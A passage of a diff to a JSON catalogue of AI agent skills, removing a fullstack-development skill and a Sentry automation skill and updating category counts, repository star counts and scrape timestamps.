```bash\n   python scripts/component_generator.py FormValidation --type hook\n   ```\n\n### Generator Options\n\n| Option          | Description                                  |\n| --------------- | -------------------------------------------- |\n| `--type client` | Client component with 'use client' (default) |\n| `--type server` | Async server component                       |\n| `--type hook`   | Custom React hook                            |\n| `--with-test`   | Include test file                            |\n| `--with-story`  | Include Storybook story                      |\n| `--flat`        | Create in output dir without subdirectory    |\n| `--dry-run`     | Preview without creating files               |\n\n### Generated Component Example\n\n```tsx\n\"use client\";\n\nimport { useState } from \"react\";\nimport { cn } from \"@/lib/utils\";\n\ninterface ButtonProps {\n  className?: string;\n  children?: React.ReactNode;\n}\n\nexport function Button({ className, children }: ButtonProps) {\n  return <div className={cn(\"\", className)}>{children}</div>;\n}\n```\n\n---\n\n## Bundle Analysis\n\nAnalyze package.json and project structure for bundle optimization opportunities.\n\n### Workflow: Optimize Bundle Size\n\n1. Run the analyzer on your project:\n\n   ```bash\n   python scripts/bundle_analyzer.py /path/to/project\n   ```\n\n2. Review the health score and issues:\n\n   ```\n   Bundle Health Score: 75/100 (C)\n\n   HEAVY DEPENDENCIES:\n     moment (290KB)\n       Alternative: date-fns (12KB) or dayjs (2KB)\n\n     lodash (71KB)\n       Alternative: lodash-es with tree-shaking\n   ```\n\n3. Apply the recommended fixes by replacing heavy dependencies.\n\n4. Re-run with verbose mode to check import ",
-      "tags": [
-        "python",
-        "typescript",
-        "react",
-        "node",
-        "nextjs",
-        "api",
-        "claude",
-        "ai",
-        "automation",
-        "workflow"
-      ],
-      "useCases": [
-        "Use when scaffolding a new React or Next.js project with TypeScript and Tailwind CSS.",
-        "Use when generating new components or custom hooks.",
-        "Use when analyzing and optimizing bundle sizes for frontend applications.",
-        "Use to implement or review advanced React patterns like Compound Components or Render Props.",
-        "Use to ensure accessibility compliance and implement robust testing strategies."
-      ],
-      "scrapedAt": "2026-03-09T07:16:02.826Z"
-    },
-    {
-      "id": "antigravity-senior-fullstack",
-      "name": "senior-fullstack",
-      "slug": "senior-fullstack",
-      "description": "Comprehensive fullstack development skill for building complete web applications with React, Next.js, Node.js, GraphQL, and PostgreSQL. Includes project scaffolding, code quality analysis, architec...",
-      "category": "Development & Code Tools",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/senior-fullstack",
-      "content": "\n# Senior Fullstack\n\nComplete toolkit for senior fullstack with modern tools and best practices.\n\n## Quick Start\n\n### Main Capabilities\n\nThis skill provides three core capabilities through automated scripts:\n\n```bash\n# Script 1: Fullstack Scaffolder\npython scripts/fullstack_scaffolder.py [options]\n\n# Script 2: Project Scaffolder\npython scripts/project_scaffolder.py [options]\n\n# Script 3: Code Quality Analyzer\npython scripts/code_quality_analyzer.py [options]\n```\n\n## Core Capabilities\n\n### 1. Fullstack Scaffolder\n\nAutomated tool for fullstack scaffolder tasks.\n\n**Features:**\n- Automated scaffolding\n- Best practices built-in\n- Configurable templates\n- Quality checks\n\n**Usage:**\n```bash\npython scripts/fullstack_scaffolder.py <project-path> [options]\n```\n\n### 2. Project Scaffolder\n\nComprehensive analysis and optimization tool.\n\n**Features:**\n- Deep analysis\n- Performance metrics\n- Recommendations\n- Automated fixes\n\n**Usage:**\n```bash\npython scripts/project_scaffolder.py <target-path> [--verbose]\n```\n\n### 3. Code Quality Analyzer\n\nAdvanced tooling for specialized tasks.\n\n**Features:**\n- Expert-level automation\n- Custom configurations\n- Integration ready\n- Production-grade output\n\n**Usage:**\n```bash\npython scripts/code_quality_analyzer.py [arguments] [options]\n```\n\n## Reference Documentation\n\n### Tech Stack Guide\n\nComprehensive guide available in `references/tech_stack_guide.md`:\n\n- Detailed patterns and practices\n- Code examples\n- Best practices\n- Anti-patterns to avoid\n- Real-world scenarios\n\n### Architecture Patterns\n\nComplete workflow documentation in `references/architecture_patterns.md`:\n\n- Step-by-step processes\n- Optimization strategies\n- Tool integrations\n- Performance tuning\n- Troubleshooting guide\n\n### Development Workflows\n\nTechnical reference guide in `references/development_workflows.md`:\n\n- Technology stack details\n- Configuration examples\n- Integration patterns\n- Security considerations\n- Scalability guidelines\n\n## Tech Stack\n\n**Languages:** TypeScript, JavaScript, Python, Go, Swift, Kotlin\n**Frontend:** React, Next.js, React Native, Flutter\n**Backend:** Node.js, Express, GraphQL, REST APIs\n**Database:** PostgreSQL, Prisma, NeonDB, Supabase\n**DevOps:** Docker, Kubernetes, Terraform, GitHub Actions, CircleCI\n**Cloud:** AWS, GCP, Azure\n\n## Development Workflow\n\n### 1. Setup and Configuration\n\n```bash\n# Install dependencies\nnpm install\n# or\npip install -r requirements.txt\n\n# Configure environment\ncp .env.example .env\n```\n\n### 2. Run Quality Checks\n\n```bash\n# Use the analyzer script\npython scripts/project_scaffolder.py .\n\n# Review recommendations\n# Apply fixes\n```\n\n### 3. Implement Best Practices\n\nFollow the patterns and practices documented in:\n- `references/tech_stack_guide.md`\n- `references/architecture_patterns.md`\n- `references/development_workflows.md`\n\n## Best Practices Summary\n\n### Code Quality\n- Follow established patterns\n- Write comprehensive tests\n- Document decisions\n- Review regularly\n\n### Performance\n- Measure before optimizing\n- Use appropriate caching\n- Optimize critical paths\n- Monitor in production\n\n### Security\n- Validate all inputs\n- Use parameterized queries\n- Implement proper authentication\n- Keep dependencies updated\n\n### Maintainability\n- Write clear code\n- Use consistent naming\n- Add helpful comments\n- Keep it simple\n\n## Common Commands\n\n```bash\n# Development\nnpm run dev\nnpm run build\nnpm run test\nnpm run lint\n\n# Analysis\npython scripts/project_scaffolder.py .\npython scripts/code_quality_analyzer.py --analyze\n\n# Deployment\ndocker build -t app:latest .\ndocker-compose up -d\nkubectl apply -f k8s/\n```\n\n## Troubleshooting\n\n### Common Issues\n\nCheck the comprehensive troubleshooting section in `references/development_workflows.md`.\n\n### Getting Help\n\n- Review reference documentation\n- Check script output messages\n- Consult tech stack documentation\n- Review error logs\n\n## Resources\n\n- Pattern Reference: `references/tech_stack_guide.md`\n- Workflow Guide: `references/architecture_patterns.md`\n- Technical Guide: `references/development_workflows.md`\n- Tool Scripts: `scripts/` directory\n\n## When to Use\nThis skill is applicable to execute the workflow or actions described in the overview.\n",
-      "tags": [
-        "python",
-        "javascript",
-        "typescript",
-        "react",
-        "node",
-        "api",
-        "ai",
-        "automation",
-        "workflow",
-        "template"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-03-09T07:16:03.495Z"
-    },
-    {
-      "id": "antigravity-sentry-automation",
-      "name": "sentry-automation",
-      "slug": "sentry-automation",
-      "description": "Automate Sentry tasks via Rube MCP (Composio): manage issues/events, configure alerts, track releases, monitor projects and teams. Always search tools first for current schemas.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/sentry-automation",
-      "content": "\n# Sentry Automation via Rube MCP\n\nAutomate Sentry error tracking and monitoring operations through Composio's Sentry toolkit via Rube MCP.\n\n## Prerequisites\n\n- Rube MCP must be connected (RUBE_SEARCH_TOOLS available)\n- Active Sentry connection via `RUBE_MANAGE_CONNECTIONS` with toolkit `sentry`\n- Always call `RUBE_SEARCH_TOOLS` first to get current tool schemas\n\n## Setup\n\n**Get Rube MCP**: Add `https://rube.app/mcp` as an MCP server in your client configuration. No API keys needed — just add the endpoint and it works.\n\n\n1. Verify Rube MCP is available by confirming `RUBE_SEARCH_TOOLS` responds\n2. Call `RUBE_MANAGE_CONNECTIONS` with toolkit `sentry`\n3. If connection is not ACTIVE, follow the returned auth link to complete Sentry OAuth\n4. Confirm connection status shows ACTIVE before running any workflows\n\n## Core Workflows\n\n### 1. Investigate Issues\n\n**When to use**: User wants to find, inspect, or triage error issues\n\n**Tool sequence**:\n1. `SENTRY_LIST_AN_ORGANIZATIONS_ISSUES` - List issues across the organization [Required]\n2. `SENTRY_GET_ORGANIZATION_ISSUE_DETAILS` - Get detailed info on a specific issue [Optional]\n3. `SENTRY_LIST_AN_ISSUES_EVENTS` - View individual error events for an issue [Optional]\n4. `SENTRY_RETRIEVE_AN_ISSUE_EVENT` - Get full event details with stack trace [Optional]\n5. `SENTRY_RETRIEVE_ISSUE_TAG_DETAILS` - Inspect tag distribution for an issue [Optional]\n\n**Key parameters**:\n- `organization_id_or_slug`: Organization identifier\n- `issue_id`: Numeric issue ID\n- `query`: Search query (e.g., `is:unresolved`, `assigned:me`, `browser:Chrome`)\n- `sort`: Sort order (`date`, `new`, `freq`, `priority`)\n- `statsPeriod`: Time window for stats (`24h`, `14d`, etc.)\n\n**Pitfalls**:\n- `organization_id_or_slug` is the org slug (e.g., 'my-org'), not the display name\n- Issue IDs are numeric; do not confuse with event IDs which are UUIDs\n- Query syntax uses Sentry's search format: `is:unresolved`, `assigned:me`, `!has:release`\n- Events within an issue can have different stack traces; inspect individual events for details\n\n### 2. Manage Project Issues\n\n**When to use**: User wants to view issues scoped to a specific project\n\n**Tool sequence**:\n1. `SENTRY_RETRIEVE_ORGANIZATION_PROJECTS` - List projects to find project slug [Prerequisite]\n2. `SENTRY_RETRIEVE_PROJECT_ISSUES_LIST` - List issues for a specific project [Required]\n3. `SENTRY_RETRIEVE_ISSUE_EVENTS_BY_ID` - Get events for a specific issue [Optional]\n\n**Key parameters**:\n- `organization_id_or_slug`: Organization identifier\n- `project_id_or_slug`: Project identifier\n- `query`: Search filter string\n- `statsPeriod`: Stats time window\n\n**Pitfalls**:\n- Project slugs are different from project display names\n- Always resolve project names to slugs via RETRIEVE_ORGANIZATION_PROJECTS first\n- Project-scoped issue lists may have different pagination than org-scoped lists\n\n### 3. Configure Alert Rules\n\n**When to use**: User wants to create or manage alert rules for a project\n\n**Tool sequence**:\n1. `SENTRY_RETRIEVE_ORGANIZATION_PROJECTS` - Find project for the alert [Prerequisite]\n2. `SENTRY_RETRIEVE_PROJECT_RULES_BY_ORG_AND_PROJECT_ID` - List existing rules [Optional]\n3. `SENTRY_CREATE_PROJECT_RULE_FOR_ALERTS` - Create a new alert rule [Required]\n4. `SENTRY_CREATE_ORGANIZATION_ALERT_RULE` - Create org-level metric alert [Alternative]\n5. `SENTRY_UPDATE_ORGANIZATION_ALERT_RULES` - Update existing alert rules [Optional]\n6. `SENTRY_RETRIEVE_ALERT_RULE_DETAILS` - Inspect specific alert rule [Optional]\n7. `SENTRY_GET_PROJECT_RULE_DETAILS` - Get project-level rule details [Optional]\n\n**Key parameters**:\n- `name`: Alert rule name\n- `conditions`: Array of trigger conditions\n- `actions`: Array of actions to perform when triggered\n- `filters`: Array of event filters\n- `frequency`: How often to trigger (in minutes)\n- `actionMatch`: 'all', 'any', or 'none' for condition matching\n\n**Pitfalls**:\n- Project-level rules (CREATE_PROJECT_RULE) and org-level metric alerts (CREATE_ORGANIZATION_ALERT_RULE) are different\n- Conditions, actions, and filters use specific JSON schemas; check Sentry docs for valid types\n- `frequency` is in minutes; setting too low causes alert fatigue\n- `actionMatch` defaults may vary; explicitly set to avoid unexpected behavior\n\n### 4. Manage Releases\n\n**When to use**: User wants to create, track, or manage release versions\n\n**Tool sequence**:\n1. `SENTRY_LIST_ORGANIZATION_RELEASES` - List existing releases [Optional]\n2. `SENTRY_CREATE_RELEASE_FOR_ORGANIZATION` - Create a new release [Required]\n3. `SENTRY_UPDATE_RELEASE_DETAILS_FOR_ORGANIZATION` - Update release metadata [Optional]\n4. `SENTRY_CREATE_RELEASE_DEPLOY_FOR_ORG` - Record a deployment for a release [Optional]\n5. `SENTRY_UPLOAD_RELEASE_FILE_TO_ORGANIZATION` - Upload source maps or files [Optional]\n\n**Key parameters**:\n- `version`: Release version string (e.g., '1.0.0', commit SHA)\n- `projects`: Array of project slugs this release belongs to\n- `dateReleased`: Release timestamp (ISO 8601)\n- `envi",
-      "tags": [
-        "api",
-        "mcp",
-        "ai",
-        "automation",
-        "workflow",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-03-09T07:16:04.241Z"
-    },
-    {
       "id": "anthropic-skill-creator",
       "name": "skill-creator",
       "slug": "skill-creator",
@@ -25766,21 +25753,21 @@
       "name": "AI & Agents",
       "description": "AI agent development, memory systems, and autonomous workflows.",
       "icon": "bot",
-      "count": 362
+      "count": 365
     },
     {
       "id": "document-processing",
       "name": "Document Processing",
       "description": "Create, edit, and analyze documents including Word, PDF, PowerPoint, and Excel files.",
       "icon": "file-text",
-      "count": 353
+      "count": 351
     },
     {
       "id": "development-code-tools",
       "name": "Development & Code Tools",
       "description": "Tools for building, testing, and deploying software with AI assistance.",
       "icon": "code",
-      "count": 130
+      "count": 129
     },
     {
       "id": "creative-media",
@@ -25838,48 +25825,48 @@
       "url": "https://github.com/obra/superpowers",
       "skillCount": 14,
       "newSkillCount": 0,
-      "stars": 78571
+      "stars": 80559
     },
     {
       "name": "Anthropic",
       "url": "https://github.com/anthropics/skills",
       "skillCount": 15,
       "newSkillCount": 2,
-      "stars": 91154
+      "stars": 92218
     },
     {
       "name": "ComposioHQ",
       "url": "https://github.com/ComposioHQ/awesome-claude-skills",
       "skillCount": 19,
       "newSkillCount": 8,
-      "stars": 43212
+      "stars": 43559
     },
     {
       "name": "OpenHands",
       "url": "https://github.com/OpenHands/OpenHands",
       "skillCount": 26,
       "newSkillCount": 0,
-      "stars": 68954
+      "stars": 69018
     },
     {
       "name": "Awesome LLM",
       "url": "https://github.com/Prat011/awesome-llm-skills",
       "skillCount": 25,
       "newSkillCount": 0,
-      "stars": 985
+      "stars": 989
     },
     {
       "name": "Antigravity",
       "url": "https://github.com/sickn33/antigravity-awesome-skills",
       "skillCount": 1006,
-      "newSkillCount": 10,
-      "stars": 23415
+      "newSkillCount": 9,
+      "stars": 23827
     }
   ],
-  "lastUpdated": "2026-03-12T07:14:00.281Z",
+  "lastUpdated": "2026-03-13T07:10:14.120Z",
   "stats": {
     "totalSkills": 1105,
-    "newSkills": 20,
-    "scrapedAt": "2026-03-12T07:14:00.281Z"
+    "newSkills": 19,
+    "scrapedAt": "2026-03-13T07:10:14.120Z"
   }
 }
